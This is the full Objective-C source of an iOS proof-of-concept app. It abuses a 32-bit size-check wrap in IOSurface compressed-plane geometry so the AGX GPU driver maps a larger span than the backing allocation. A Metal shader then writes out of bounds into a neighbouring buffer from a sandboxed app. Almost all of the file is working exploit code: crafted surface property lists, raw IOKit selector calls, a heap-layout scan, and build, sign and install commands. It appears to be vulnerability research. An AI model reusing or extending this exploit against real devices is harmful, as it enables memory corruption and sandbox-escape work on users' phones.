// F1OOB-PoC — IOSurface compressed-plane 32-bit wrap -> AGX/Metal cross-object GPU OOB write.
//
// What this demonstrates:
//   1. A sandboxed app creates an IOSurface whose compressed-plane geometry passes
//      the kernel's multi-slice size check because the check is done in 32-bit:
//          (DataRegionBytesPerSlice + HeaderRegionBytesPerSlice) * SliceCount
//      wraps modulo 2^32 and becomes 0x10000, so a 4 GiB + 64 KiB logical region
//      is accepted for a 64 KiB allocation.
//   2. The IOSurface is handed to the AGX accelerator (selector 8, type 0x82).
//      The AGX resource is built with a 16 MiB length (out+0x28 on this device),
//      while the actual IOSurface allocation is only 64 KiB.
//   3. The same surface is wrapped in a 64 KiB MTLBuffer. The GPU VA of that
//      buffer is the start of the AGX resource's 16 MiB range. A second Metal
//      buffer allocated afterwards is placed inside that range.
//   4. A compute shader writes through the F1 buffer at the victim's GPU address.
//      The write lands in the victim MTLBuffer, proving a cross-object GPU OOB
//      write from a sandboxed app.
//
// This is NOT a kernel R/W primitive:
//   - the write stays inside the app's GPU VA/UAT context;
//   - it can only reach GPU pages that are already mapped in that context;
//   - the 16 MiB span is first-mapping-only on this build and is not guaranteed;
//   - fixed offsets are not portable; target by runtime gpuAddress.
//
// Build (Theos):
//   make ipa
// Sign (zsign):
//   zsign -k cert.p12 -p <pass> -m profile.mobileprovision -o F1OOB-PoC-signed.ipa F1OOB-PoC.ipa
// Install:
//   pymobiledevice3 apps install F1OOB-PoC-signed.ipa
// Run:
//   pymobiledevice3 developer core-device launch-application app.lake9674.aquila8809
// Logs:
//   Documents/F1OOB-PoC/latest.log

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <Metal/Metal.h>
#import <objc/message.h>
#import <sys/utsname.h>
#import <pthread.h>
#import <string.h>

extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
    mach_vm_address_t address, mach_vm_size_t size,
    mach_vm_address_t data, mach_vm_size_t *outsize);

static NSString *gDir;
static NSString *gLogPath;
static NSMutableString *gLog;
static pthread_mutex_t gLock = PTHREAD_MUTEX_INITIALIZER;

static void L(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    pthread_mutex_lock(&gLock);
    [gLog appendString:s];
    [gLog appendString:@"\n"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    pthread_mutex_unlock(&gLock);
    NSLog(@"[F1OOB] %@", s);
}

static uint32_t rd32(const void *p) {
    uint32_t v;
    memcpy(&v, p, 4);
    return v;
}

static uint64_t rd64(const void *p) {
    uint64_t v;
    memcpy(&v, p, 8);
    return v;
}

static uint64_t gpu_address(id obj) {
    SEL sel = NSSelectorFromString(@"gpuAddress");
    if (!obj || ![obj respondsToSelector:sel]) return 0;
    return ((uint64_t (*)(id, SEL))objc_msgSend)(obj, sel);
}

// Normal 64x64 BGRA control surface. It is created before the F1 surface so the
// IOSurface ID/allocator state matches the original crash/repro sequence.
static NSString *normal_xml(void) {
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>64</integer>"
    "<key>IOSurfaceHeight</key><integer>64</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    "</dict></plist>\n";
}

// Parametrized F1 surface: constants identical to the original f1_xml (4/0x40000000/0x4000).
static NSString *f1_xml2(uint32_t slices, uint64_t data, uint64_t hdr) {
    return [NSString stringWithFormat:
        @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\"><dict>\n"
        "<key>IOSurfaceWidth</key><integer>64</integer>\n"
        "<key>IOSurfaceHeight</key><integer>64</integer>\n"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>\n"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>\n"
        "<key>IOSurfaceAllocSize</key><integer>65536</integer>\n"
        "<key>IOSurfaceSliceCount</key><integer>%u</integer>\n"
        "<key>IOSurfacePlaneInfo</key><array><dict>\n"
        "<key>IOSurfacePlaneWidth</key><integer>64</integer>\n"
        "<key>IOSurfacePlaneHeight</key><integer>64</integer>\n"
        "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>\n"
        "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>\n"
        "<key>IOSurfacePlaneSize</key><integer>65536</integer>\n"
        "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>\n"
        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>%llu</integer>\n"
        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>%llu</integer>\n"
        "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>\n"
        "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>\n"
        "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>\n"
        "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>\n"
        "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>\n"
        "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>\n"
        "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>\n"
        "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer>\n"
        "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>\n"
        "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>\n"
        "</dict></array></dict></plist>\n",
        slices, (unsigned long long)data, (unsigned long long)hdr];
}

static NSString *f1_xml(void) { return f1_xml2(4, 0x4000ULL, 0x40000000ULL); }
// Header value that makes the 32-bit size check wrap to the plane size while
// the per-slice data region stays large.
static uint64_t wrap_hdr(uint32_t slices, uint64_t data, uint64_t plane) {
    if (slices == 0 || plane % slices) return 0;
    uint64_t per = plane / slices;
    uint64_t mod = (1ULL << 32) / slices;
    uint64_t target = per + mod;
    if (target < data) return 0;
    return target - data;
}

// Same XML as f1_xml2 with plane and alloc sizes overridden.
static NSString *f1_xml3(uint32_t slices, uint64_t data, uint64_t hdr,
                         uint64_t planeSize, uint64_t allocSize) {
    NSString *s = f1_xml2(slices, data, hdr);
    NSString *planeOld = @"<key>IOSurfacePlaneSize</key><integer>65536</integer>";
    NSString *planeNew = [NSString stringWithFormat:@"<key>IOSurfacePlaneSize</key><integer>%llu</integer>", (unsigned long long)planeSize];
    NSString *allocOld = @"<key>IOSurfaceAllocSize</key><integer>65536</integer>";
    NSString *allocNew = [NSString stringWithFormat:@"<key>IOSurfaceAllocSize</key><integer>%llu</integer>", (unsigned long long)allocSize];
    s = [s stringByReplacingOccurrencesOfString:planeOld withString:planeNew];
    s = [s stringByReplacingOccurrencesOfString:allocOld withString:allocNew];
    return s;
}


// Raw IOSurfaceRoot selector 0 (the same in-band XML path used by the kernel parser).
static uint32_t create_surface(io_connect_t conn, NSString *xml, const char *tag) {
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;
    if (!xc || xlen > 0x1000) {
        L(@"[%s] XML too large: %zu", tag, xlen);
        return 0;
    }
    uint64_t sc[1] = {0};
    uint8_t *info = calloc(1, 0xc68);
    size_t isz = 0xc68;
    kern_return_t kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen,
                                           NULL, NULL, info, &isz);
    uint32_t sid = isz >= 0x1c ? rd32(info + 0x18) : 0;
    L(@"[%s] sel0=0x%x out=0x%zx id=%u", tag, kr, isz, sid);
    if (kr == KERN_SUCCESS && isz >= 0x78) {
        L(@"[%s] sliceCount=0x%x headerPerSlice=0x%x dataPerSlice=0x%x",
          tag, rd32(info + 0x74), rd32(info + 0x88 + 0x84),
          rd32(info + 0x88 + 0x80));
    }
    free(info);
    return kr == KERN_SUCCESS ? sid : 0;
}

static io_service_t find_agx_service(void) {
    io_registry_entry_t root = IORegistryGetRootEntry(kIOMasterPortDefault);
    if (!root) { L(@"[AGX] no registry root"); return 0; }
    io_iterator_t it = 0;
    kern_return_t kr = IORegistryEntryCreateIterator(root, kIOServicePlane,
                                                     kIORegistryIterateRecursively, &it);
    if (kr != KERN_SUCCESS || !it) {
        L(@"[AGX] iterator failed 0x%x", kr);
        return 0;
    }
    io_service_t found = 0;
    io_object_t e;
    long n = 0;
    while ((e = IOIteratorNext(it)) != 0) {
        char cls[128] = {0};
        IOObjectGetClass(e, cls);
        if (strncmp(cls, "AGX", 3) == 0) {
            L(@"[AGX] scan[%ld] class=%s", n, cls);
            if (!found && strncmp(cls, "AGXAccelerator", 14) == 0) {
                found = e;  // ownership transferred; do not release
                continue;
            }
        }
        IOObjectRelease(e);
        n++;
        if (n > 20000) { L(@"[AGX] scan limit hit at %ld", n); break; }
    }
    IOObjectRelease(it);
    if (!found) L(@"[AGX] no AGXAccelerator service in registry");
    return found;
}

// AGX accelerator selector 8, type 0x82: build a GPU resource from an IOSurface.
// out+0x00 = GPU VA of the resource, out+0x28 = resource length/span.
// Open the AGX accelerator device user client (type 1) once.
static io_connect_t agx_open_device(void) {
    io_service_t agx = find_agx_service();
    if (!agx) {
        L(@"[AGX] no accelerator service to open");
        return 0;
    }
    char cls[128] = {0};
    IOObjectGetClass(agx, cls);
    io_connect_t ac = 0;
    kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
    IOObjectRelease(agx);
    L(@"[AGX] IOServiceOpen(type=1) -> 0x%x conn=0x%x", kr, ac);
    if (kr != KERN_SUCCESS) return 0;
    return ac;
}

// selector 8 probe with explicit resource type/flags.
typedef struct {
    uint64_t ga, span, obj, v30, v38, v50;
} agxsel8_t;

static kern_return_t agx_sel8(io_connect_t ac, uint32_t type, uint32_t flags, uint32_t sid, int verbose, agxsel8_t *r) {
    uint8_t *in = calloc(1, 0x100);
    uint8_t *out = calloc(1, 0x1000);
    *(uint32_t *)(in + 0x00) = type;
    *(uint32_t *)(in + 0x34) = flags;
    *(uint32_t *)(in + 0x38) = sid;
    size_t osz = 0x1000;
    kern_return_t kr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
    r->ga = rd64(out + 0x00);
    r->span = rd64(out + 0x28);
    r->obj = rd64(out + 0x10);
    r->v30 = rd64(out + 0x30);
    r->v38 = rd64(out + 0x38);
    r->v50 = rd64(out + 0x50);
    if (verbose) {
        L(@"[TPE] t=0x%x f=0x%x sid=%u kr=0x%x ga=0x%llx span=0x%llx v30=0x%llx",
          type, flags, sid, kr, r->ga, r->span, r->v30);
        if (r->span > 0x10000)
            L(@"[TPE] *** BIG SPAN t=0x%x f=0x%x span=0x%llx ***", type, flags, r->span);
        for (size_t o = 0; o < 0x60; o += 8) {
            uint64_t v = rd64(out + o);
            if (v) L(@"[TPEOUT] +0x%02zx = 0x%016llx", o, (unsigned long long)v);
        }
    }
    free(in);
    free(out);
    return kr;
}

// Baseline mapping used by the Metal stage (identical semantics to the v2/v3 build).
static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
    *span = 0;
    *out_ac = 0;
    io_connect_t ac = agx_open_device();
    if (!ac) return 0;
    agxsel8_t r;
    kern_return_t kr = agx_sel8(ac, 0x82, 0, sid, 1, &r);
    L(@"[AGX] sel8=0x%x gpuVA=0x%llx span=0x%llx", kr, r.ga, r.span);
    if (r.obj) {
        uint8_t *buf = calloc(1, 0x200);
        mach_vm_size_t sz = 0x200;
        kern_return_t mr = mach_vm_read_overwrite(mach_task_self(), r.obj, 0x200,
                                                  (mach_vm_address_t)buf, &sz);
        L(@"[AGX] vm_read(0x%llx) -> 0x%x size=0x%llx", r.obj, mr, (unsigned long long)sz);
        if (mr == KERN_SUCCESS) {
            for (size_t o = 0; o < 0x200; o += 8)
                L(@"[AGXOBJ] +0x%03zx = 0x%016llx", o, (unsigned long long)rd64(buf + o));
        }
        free(buf);
    }
    if (kr != KERN_SUCCESS) {
        IOServiceClose(ac);
        return 0;
    }
    *span = r.span;
    *out_ac = ac;
    return r.ga;
}

// Create 32 normal IOSurfaces after F1, fill them with a pattern. They reproduce
// the allocator/VA layout of the original probe; the actual OOB target is the
// Metal victim buffer below.
static int create_iosurface_victims(IOSurfaceRef *victims, int max) {
    int vc = 0;
    for (int i = 0; i < max; i++) {
        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241,
            @"IOSurfaceAllocSize": @0x10000
        };
        IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        if (!v) break;
        void *base = IOSurfaceGetBaseAddress(v);
        if (base) {
            uint32_t *p = (uint32_t *)base;
            for (size_t o = 0; o + 4 <= 0x10000; o += 4)
                p[o / 4] = 0x11111111u + (uint32_t)i;
        }
        victims[vc++] = v;
    }
    L(@"[VICTIM] IOSurfaces created=%d", vc);
    return vc;
}

// Core GPU OOB proof.
static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_t agx_span) {
    L(@"[METAL] start");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { L(@"[METAL] no device"); return; }
    L(@"[METAL] device=%@", [dev name]);

    void *base = IOSurfaceGetBaseAddress(surf);
    size_t alloc = IOSurfaceGetAllocSize(surf);
    if (!base || alloc < 0x10000) {
        L(@"[METAL] bad surface base=%p alloc=0x%zx", base, alloc);
        return;
    }

    // 64 KiB Metal wrapper around the 64 KiB IOSurface.
    id<MTLBuffer> f1buf = [dev newBufferWithBytesNoCopy:base
                                                 length:0x10000
                                                options:MTLResourceStorageModeShared
                                            deallocator:nil];
    uint64_t f1ga = gpu_address(f1buf);
    L(@"[METAL] F1 MTLBuffer=%p len=%lu gpuAddress=0x%llx agxVA=0x%llx span=0x%llx",
      f1buf, (unsigned long)f1buf.length, f1ga, agx_va, agx_span);

    // Victim buffer allocated after F1. It is expected to land inside the AGX
    // resource's 16 MiB VA range.
    // Fillers reproduce the VA placement of the original probe: after 15 x 64 KiB
    // allocations the victim lands around +0x100000 from the F1 base.
    id<MTLBuffer> fillers[6];
    for (int fi = 0; fi < 6; fi++) {
        fillers[fi] = [dev newBufferWithLength:0x10000
                                       options:MTLResourceStorageModeShared];
    }
    id<MTLBuffer> victim = [dev newBufferWithLength:0x10000
                                            options:MTLResourceStorageModeShared];
    if (!victim.contents) { L(@"[METAL] victim has no CPU contents"); return; }
    for (size_t o = 0; o + 4 <= 0x10000; o += 4)
        *(uint32_t *)((uint8_t *)victim.contents + o) = 0x42424242u;
    uint64_t victimga = gpu_address(victim);
    L(@"[METAL] victim MTLBuffer=%p len=%lu gpuAddress=0x%llx",
      victim, (unsigned long)victim.length, victimga);

    if (!f1ga || !victimga || victimga <= f1ga) {
        L(@"[METAL] no usable GPU addresses");
        return;
    }
    uint64_t delta = victimga - f1ga;
    L(@"[METAL] delta=0x%llx span=0x%llx inSpan=%s",
      delta, agx_span, (delta < agx_span) ? "yes" : "no");

    NSString *src =
        @"#include <metal_stdlib>\n"
        "using namespace metal;\n"
        "kernel void wr(device uint *buf [[buffer(0)]],\n"
        "               constant uint &idx [[buffer(1)]],\n"
        "               constant uint &val [[buffer(2)]]) {\n"
        "  buf[idx] = val;\n"
        "}\n"
        "kernel void rd(device uint *buf [[buffer(0)]],\n"
        "               device uint *out [[buffer(1)]],\n"
        "               constant uint &idx [[buffer(2)]]) {\n"
        "  out[0] = buf[idx];\n"
        "}\n";
    NSError *err = nil;
    id<MTLLibrary> lib = [dev newLibraryWithSource:src options:nil error:&err];
    if (!lib) { L(@"[METAL] library error=%@", err); return; }
    id<MTLFunction> fwr = [lib newFunctionWithName:@"wr"];
    id<MTLFunction> frd = [lib newFunctionWithName:@"rd"];
    id<MTLComputePipelineState> pwr = fwr ? [dev newComputePipelineStateWithFunction:fwr error:&err] : nil;
    id<MTLComputePipelineState> prd = frd ? [dev newComputePipelineStateWithFunction:frd error:&err] : nil;
    if (!pwr || !prd) { L(@"[METAL] pipeline error=%@", err); return; }

    id<MTLBuffer> out = [dev newBufferWithLength:16 options:MTLResourceStorageModeShared];
    id<MTLCommandQueue> q = [dev newCommandQueue];

    // Vagabond scan: filler+victim pairs, each victim targeted by runtime gpuAddress.
    const uint32_t marker32 = 0x43434343u;
    const uint32_t fill32 = 0x42424242u;
    int hit = 0;
    for (int k = 0; k < 24 && !hit; k++) {
        id<MTLBuffer> filler = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
        id<MTLBuffer> vic = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
        if (!filler || !vic) break;
        if (vic.contents) {
            uint32_t *vp = (uint32_t *)vic.contents;
            for (size_t o = 0; o + 4 <= 0x10000; o += 4) vp[o / 4] = fill32;
        }
        uint64_t vga = gpu_address(vic);
        uint64_t d = (vga > f1ga) ? (vga - f1ga) : 0;
        L(@"[SCAN] k=%d vic=0x%llx delta=0x%llx", k, vga, d);
        if (vga > f1ga && d < 0x10000000) {
            uint32_t idx = (uint32_t)(d / 4);
            id<MTLCommandBuffer> nb = [q commandBuffer];
            id<MTLComputeCommandEncoder> ne = [nb computeCommandEncoder];
            [ne setComputePipelineState:pwr];
            [ne setBuffer:f1buf offset:0 atIndex:0];
            [ne setBytes:&idx length:4 atIndex:1];
            [ne setBytes:(void *)&marker32 length:4 atIndex:2];
            [ne dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [ne endEncoding];
            [nb commit];
            [nb waitUntilCompleted];
            uint32_t back = 0;
            memcpy(&back, vic.contents, 4);
            if (back == marker32) {
                hit = 1;
                L(@"[SCAN] *** CROSS-OBJECT HIT k=%d delta=0x%llx ***", k, d);
            } else {
                L(@"[SCAN] miss k=%d idx=0x%x back=0x%08x", k, idx, back);
            }
        }
    }

    if (delta > 0 && delta < 0x1000000) {
        uint32_t idx = (uint32_t)(delta / 4);
        uint32_t marker = 0x43434343u;

        id<MTLCommandBuffer> wb = [q commandBuffer];
        id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
        [we setComputePipelineState:pwr];
        [we setBuffer:f1buf offset:0 atIndex:0];
        [we setBytes:&idx length:4 atIndex:1];
        [we setBytes:&marker length:4 atIndex:2];
        [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [we endEncoding];
        [wb commit];
        [wb waitUntilCompleted];
        L(@"[METAL] WRITE idx=0x%x marker=0x%08x status=%lu err=%@",
          idx, marker, (unsigned long)wb.status, wb.error);

        uint32_t back = 0;
        memcpy(&back, victim.contents, 4);
        L(@"[METAL] VICTIM[0]=0x%08x", back);
        if (back == marker) {
            L(@"[METAL] *** CROSS-OBJECT GPU OOB WRITE CONFIRMED ***");
        } else {
            L(@"[METAL] no cross-object hit");
        }

        // Restore the victim's first word so the demo is non-destructive.
        uint32_t orig = 0x42424242u;
        id<MTLCommandBuffer> rb = [q commandBuffer];
        id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
        [re setComputePipelineState:pwr];
        [re setBuffer:f1buf offset:0 atIndex:0];
        [re setBytes:&idx length:4 atIndex:1];
        [re setBytes:&orig length:4 atIndex:2];
        [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [re endEncoding];
        [rb commit];
        [rb waitUntilCompleted];
        L(@"[METAL] RESTORE status=%lu err=%@", (unsigned long)rb.status, rb.error);
    }

    // Reference test: fixed 0x20000 offset. This is not portable across boots,
    // but shows whether the page at that offset is backed in this run.
    {
        uint32_t idx = 0x20000 / 4;
        uint32_t marker = 0x41414141u;
        id<MTLCommandBuffer> wb = [q commandBuffer];
        id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
        [we setComputePipelineState:pwr];
        [we setBuffer:f1buf offset:0 atIndex:0];
        [we setBytes:&idx length:4 atIndex:1];
        [we setBytes:&marker length:4 atIndex:2];
        [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [we endEncoding];
        [wb commit];
        [wb waitUntilCompleted];
        uint32_t back = 0;
        id<MTLCommandBuffer> rb = [q commandBuffer];
        id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
        [re setComputePipelineState:prd];
        [re setBuffer:f1buf offset:0 atIndex:0];
        [re setBuffer:out offset:0 atIndex:1];
        [re setBytes:&idx length:4 atIndex:2];
        [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [re endEncoding];
        [rb commit];
        [rb waitUntilCompleted];
        if (out.contents) memcpy(&back, out.contents, 4);
        L(@"[METAL] FIXED +0x20000 write=0x%08x readback=0x%08x (may be 0/unbacked)",
          marker, back);
    }

    L(@"[METAL] done");
}

static void run(void) {
    struct utsname un;
    uname(&un);
    L(@"=== F1OOB-PoC start ===");
    L(@"device=%s version=%s", un.machine, un.version);

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[F1] no IOSurfaceRoot"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"[F1] IOSurfaceRoot open=0x%x conn=0x%x", kr, conn);
    if (kr != KERN_SUCCESS) return;

    uint32_t ctrl_sid = create_surface(conn, normal_xml(), "CTRL");
    uint32_t sid = create_surface(conn, f1_xml(), "F1");
    if (!sid) { L(@"[F1] F1 surface rejected"); IOServiceClose(conn); return; }

    IOSurfaceRef surf = IOSurfaceLookup(sid);
    if (!surf) { L(@"[F1] IOSurfaceLookup(%u) failed", sid); IOServiceClose(conn); return; }
    void *base = IOSurfaceGetBaseAddress(surf);
    size_t alloc = IOSurfaceGetAllocSize(surf);
    L(@"[F1] id=%u base=%p alloc=0x%zx planes=%zu",
      sid, base, alloc, IOSurfaceGetPlaneCount(surf));
    if (base) {
        size_t planes = IOSurfaceGetPlaneCount(surf);
        for (size_t i = 0; i < planes && i < 4; i++) {
            void *pb = IOSurfaceGetBaseAddressOfPlane(surf, i);
            L(@"[F1] plane[%zu] base=%p bpr=%zu h=%zu", i, pb,
              IOSurfaceGetBytesPerRowOfPlane(surf, i),
              IOSurfaceGetHeightOfPlane(surf, i));
        }
    }

    IOSurfaceRef ios_victims[32];
    int ivc = create_iosurface_victims(ios_victims, 32);

    // ---- geometry sweep: the 32-bit check keeps wrapping to the small plane
    //      while the per-slice data region grows; span should follow data*slices ----
    io_connect_t acb = agx_open_device();
    if (acb) {
        static const uint32_t gsl[7] = { 4, 4, 4, 4, 2, 2, 4 };
        static const uint64_t gdt[7] = { 0x10000ULL, 0x40000ULL, 0x100000ULL, 0x400000ULL, 0x80000ULL, 0x200000ULL, 0x4000ULL };
        static const uint64_t gpl[7] = { 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x100000ULL };
        static const uint64_t gal[7] = { 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x100000ULL };
        for (size_t j = 0; j < 7; j++) {
            uint64_t h = wrap_hdr(gsl[j], gdt[j], gpl[j]);
            uint32_t gsid = create_surface(conn, f1_xml3(gsl[j], gdt[j], h, gpl[j], gal[j]), "GD");
            if (!gsid) {
                L(@"[GD%zu] rejected s=%u d=0x%llx p=0x%llx", j, gsl[j],
                  (unsigned long long)gdt[j], (unsigned long long)gpl[j]);
                continue;
            }
            IOSurfaceRef gsrf = IOSurfaceLookup(gsid);
            if (gsrf) {
                L(@"[GD%zu] s=%u d=0x%llx h=0x%llx p=0x%llx alloc=0x%zx", j, gsl[j],
                  (unsigned long long)gdt[j], (unsigned long long)h,
                  (unsigned long long)gpl[j], IOSurfaceGetAllocSize(gsrf));
                CFRelease(gsrf);
            }
            agxsel8_t gr;
            agx_sel8(acb, 0x82, 0, gsid, 1, &gr);
            L(@"[GD%zu] span=0x%llx obj=0x%llx", j, (unsigned long long)gr.span,
              (unsigned long long)gr.obj);
        }
        IOServiceClose(acb);
    }
    // ---- end geometry sweep ----

    uint64_t agx_span = 0;
    io_connect_t agx_conn = 0;
    uint64_t agx_va = agx_map(sid, &agx_span, &agx_conn);

    metal_cross_object_write(surf, agx_va, agx_span);

    if (agx_conn) IOServiceClose(agx_conn);
    for (int i = 0; i < ivc; i++) CFRelease(ios_victims[i]);
    CFRelease(surf);
    (void)ctrl_sid;
    IOServiceClose(conn);
    L(@"=== F1OOB-PoC done ===");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    gLog = [NSMutableString new];
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    gDir = [docs stringByAppendingPathComponent:@"F1OOB-PoC"];
    [[NSFileManager defaultManager] createDirectoryAtPath:gDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    NSDateFormatter *df = [NSDateFormatter new];
    df.dateFormat = @"yyyyMMdd-HHmmss";
    gLogPath = [gDir stringByAppendingPathComponent:
                [NSString stringWithFormat:@"run-%@.log", [df stringFromDate:[NSDate date]]]];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"]
            atomically:YES encoding:NSUTF8StringEncoding error:nil];

    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    self.tv = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.tv.editable = NO;
    self.tv.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    [vc.view addSubview:self.tv];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            @autoreleasepool { run(); }
            dispatch_async(dispatch_get_main_queue(), ^{
                pthread_mutex_lock(&gLock);
                self.tv.text = [gLog copy];
                pthread_mutex_unlock(&gLock);
            });
        });
    });
    return YES;
}
@end

int main(int argc, char **argv) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
